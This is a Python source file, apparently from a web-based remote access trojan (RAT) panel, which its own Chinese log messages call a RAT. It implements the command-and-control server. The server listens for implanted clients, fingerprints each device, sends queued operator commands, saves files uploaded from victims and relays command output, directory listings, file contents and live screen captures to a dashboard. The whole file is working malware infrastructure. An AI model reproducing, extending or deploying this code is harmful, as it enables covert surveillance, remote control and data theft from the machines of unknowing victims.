import socket
import threading
import json
import base64
import os
import time
import queue
from datetime import datetime
from ..extensions import socketio
from ..services import client_manager
from ..config import BaseConfig
from ..utils.helpers import human_readable_size

def reliable_send(sock, data_dict):
    payload = json.dumps(data_dict).encode('utf-8') + b'\n'
    sock.sendall(payload)

def client_handler(conn, addr, client_id, app):
    q = client_manager.register_client(client_id, conn, addr)
    print(f"[+] RAT客户端已连接: {addr}, ID: {client_id}")
    socketio.emit('new_client', {'id': client_id, 'addr': str(addr)})

    # 注意：不在这里创建数据库记录，等待客户端发送完整信息后再创建

    buffer = b''
    try:
        conn.setblocking(False)
        while True:
            try:
                cmd = q.get_nowait()
                reliable_send(conn, cmd)
            except queue.Empty:
                pass

            try:
                part = conn.recv(4096)
                if not part:
                    break
                buffer += part
            except BlockingIOError:
                pass

            while b'\n' in buffer:
                message, buffer = buffer.split(b'\n', 1)
                try:
                    data = json.loads(message.decode('utf-8'))
                except:
                    continue

                if data.get('status') == 'connected':
                    # 获取设备指纹信息
                    device_fingerprint = data.get('device_fingerprint')
                    hardware_id = data.get('hardware_id')
                    mac_address = data.get('mac_address')
                    hostname = data.get('hostname')
                    
                    # 统一的客户端记录处理逻辑
                    try:
                        from ..extensions import db
                        from ..models import Client
                        with app.app_context():
                            client = None
                            created = False
                            
                            if device_fingerprint:
                                # 仅在有设备指纹时才查找或创建客户端记录
                                client, created = Client.find_or_create_by_fingerprint(
                                    device_fingerprint=device_fingerprint,
                                    hardware_id=hardware_id,
                                    mac_address=mac_address,
                                    hostname=hostname or data.get('user', '未知'),
                                    ip_address=str(addr[0]) if isinstance(addr, tuple) and len(addr) > 0 else str(addr),
                                    os_type=data.get('os'),
                                    os_version=data.get('os_version') or data.get('os'),
                                    status='online',
                                    last_seen=datetime.utcnow()
                                )
                                
                                # 只有成功创建或找到客户端时才进行数据库操作
                                if client:
                                    if created:
                                        db.session.add(client)
                                    db.session.commit()
                                    print(f"[+] 客户端记录已{'创建' if created else '更新'}: {client.client_id}")
                                    
                                    # 更新client_manager中的映射关系，将临时ID映射到数据库记录ID
                                    if client_id in client_manager.client_info:
                                        client_manager.client_info[client_id]['db_client_id'] = client.id
                                else:
                                    # 此处不应发生，因为 find_or_create_by_fingerprint 在有指纹时总会返回一个客户端
                                    print(f"[!] 无法创建或查找客户端记录，即使有设备指纹。")
                            else:
                                # 没有设备指纹时，不执行任何数据库操作，仅记录日志
                                print(f"[!] 客户端连接，但未提供设备指纹。临时ID: {client_id}。不创建数据库记录。")

                    except Exception as e:
                        print(f"[!] 处理客户端记录时出错: {e}")
                        import traceback
                        traceback.print_exc()
                    
                    # 更新内存中的客户端信息
                    info = client_manager.client_info[client_id]
                    info['user'] = data.get('user', '未知')
                    info['initial_cwd'] = data.get('cwd', '未知')
                    info['os'] = data.get('os', '未知')
                    info['hostname'] = hostname or data.get('user', '未知')
                    socketio.emit('client_updated', {'id': client_id, **info})
                    continue

                if "file" in data and "data" in data:
                    filename = data["file"]
                    content = base64.b64decode(data["data"])
                    os.makedirs(BaseConfig.DOWNLOADS_DIR, exist_ok=True)
                    unique_filename = f"{client_id}_{int(time.time())}_{os.path.basename(filename)}"
                    path = os.path.join(BaseConfig.DOWNLOADS_DIR, unique_filename)
                    with open(path, "wb") as f:
                        f.write(content)
                    socketio.emit('command_result', {'output': f"文件已保存: {unique_filename}"})

                elif "output" in data:
                    # Emit a generic result for single command sends, and a specific one for the batch commander
                    socketio.emit('command_result', {'output': data['output'], 'target_id': client_id})
                    socketio.emit('batch_command_result', {'output': data['output'], 'client_id': client_id})

                elif "dir_list" in data:
                    socketio.emit('dir_list', {'client_id': client_id, 'dir_list': data['dir_list']})

                elif "file_text" in data:
                    socketio.emit('file_text', {
                        'client_id': client_id,
                        'path': data.get('path'),
                        'text': data.get('file_text'),
                        'is_base64': data.get('is_base64', False)
                    })

                elif data.get('type') == 'screen_frame':
                    # 转发客户端屏幕帧到前端（包含尺寸与虚拟屏参数，便于坐标映射）
                    socketio.emit('screen_frame_update', {
                        'client_id': client_id,
                        'data': data.get('data'),
                        'w': data.get('w'),
                        'h': data.get('h'),
                        'vx': data.get('vx'),
                        'vy': data.get('vy'),
                        'vw': data.get('vw'),
                        'vh': data.get('vh'),
                    })

                elif data.get('type') == 'status_update':
                    # 转发状态更新到前端
                    socketio.emit('status_update', {
                        'client_id': client_id,
                        'cpu_percent': data.get('cpu_percent'),
                        'mem_percent': data.get('mem_percent')
                    })
    finally:
        # 先尝试读取映射到的数据库客户端ID
        db_client_id = None
        try:
            db_client_id = client_manager.client_info.get(client_id, {}).get('db_client_id')
        except Exception:
            pass

        client_manager.remove_client(client_id)
        conn.close()
        socketio.emit('client_disconnected', {'id': client_id})

        # 在数据库中标记离线
        try:
            from ..extensions import db
            from ..models import Client
            with app.app_context():
                client = None
                if db_client_id:
                    client = Client.query.get(db_client_id)
                if client is None:
                    # 回退方案：尽量避免使用临时连接ID，但作为兜底
                    client = Client.query.filter_by(client_id=client_id).first()
                if client:
                    client.status = 'offline'
                    client.last_seen = datetime.utcnow()
                    db.session.commit()
        except Exception as e:
            print(f"[DB] 标记客户端离线失败: {e}")

def start_tcp_server(app):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(('0.0.0.0', BaseConfig.RAT_PORT))
    srv.listen(5)
    print(f"[*] RAT TCP监听 {BaseConfig.RAT_PORT}")
    cid = 0
    while True:
        conn, addr = srv.accept()
        threading.Thread(target=client_handler, args=(conn, addr, str(cid), app), daemon=True).start()
        cid += 1
